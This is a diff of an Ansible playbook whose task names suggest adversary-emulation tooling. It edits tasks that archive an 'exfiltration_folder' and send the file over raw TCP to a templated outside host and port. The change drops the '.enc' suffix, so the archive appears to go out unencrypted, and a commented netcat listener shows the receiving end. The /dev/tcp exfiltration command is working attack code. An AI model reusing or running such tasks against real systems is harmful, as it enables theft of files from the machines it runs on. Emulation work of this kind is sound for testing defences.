@@ -23,13 +23,13 @@
     - name: Create Archive File
       archive:
         path: "{{ exfiltration_folder }}/*"
-        dest: "{{ exfiltration_file }}-tcp.gz"
+        dest: "/tmp/{{ exfiltration_file }}-tcp.gz"
         format: gz
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol TCP
       shell: |
-        cat {{ exfiltration_file }}-tcp.tar.gz.enc > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}
-        # netcat -lvp > {{ exfiltration_file }}-tcp.tar.gz.enc
+        cat {{ exfiltration_file }}-tcp.tar.gz > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}
+        # netcat -lvp > {{ exfiltration_file }}-tcp.tar.gz
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol UDP
       shell: |
